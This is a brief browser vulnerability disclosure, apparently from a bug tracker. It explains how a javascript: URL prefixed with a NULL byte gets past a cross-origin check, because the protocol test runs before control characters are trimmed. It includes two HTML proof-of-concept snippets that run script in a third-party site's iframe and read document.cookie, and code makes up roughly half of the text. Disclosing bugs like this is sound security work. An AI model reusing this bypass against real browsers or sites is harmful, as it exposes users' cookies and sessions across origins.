# javascript: url with a leading NULL byte can bypass cross origin protection.

> Well, it's not exactly StartsWith(), but the same thing for all intents and purposes.
In BindingDOMWindow::createWindow() there's a call to protocolIsJavaScript(), which
is a thin wrapper over protocolIs(), which is basically just reimplemented version of
StartsWith().
However, I'd say the real problem is completely inconsistent whitespace handling.
After the JavaScript check url_parse::TrimURL() eventually gets called, and clears
out every surrounding character less than space.

PoC 1:
```html
<iframe name="test" src="http://www.g.cn"></iframe>
<input type=button value="test"
onclick="window.open('\u0000javascript:alert(document.cookie)','test')" >
```

PoC 2:
```html
<iframe name="test" src="http://www.g.cn"></iframe>
<input type=button value="test"
onclick="window.open('\x00javascript:alert(document.cookie)','test')" >
```
